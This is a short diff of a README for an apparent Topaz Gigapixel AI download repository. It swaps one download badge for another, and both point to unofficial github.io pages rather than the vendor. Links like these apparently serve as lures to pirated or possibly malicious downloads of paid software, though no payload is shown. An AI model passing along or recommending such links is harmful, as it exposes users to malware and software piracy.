@@ -4,10 +4,8 @@
   <img src="https://photorumors.com/wp-content/uploads/2019/08/Topaz-Labs-Gigapixel-AI-software-1.png" alt="Project Logo"/>
 </div>
 
-<div align="center">
+[![GET Topaz Gigapixel](https://img.shields.io/badge/GET%20%E2%80%94%20Topaz-Gigapixel-0078D6?style=for-the-badge&logoColor=white)](https://nasrhkr66596.github.io/.github/Topaz-Gigapixel)
 
-  [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://topaz-gigapixel-ai-windows-toolkit.github.io/.github/)
-</div>
 
 ---
 
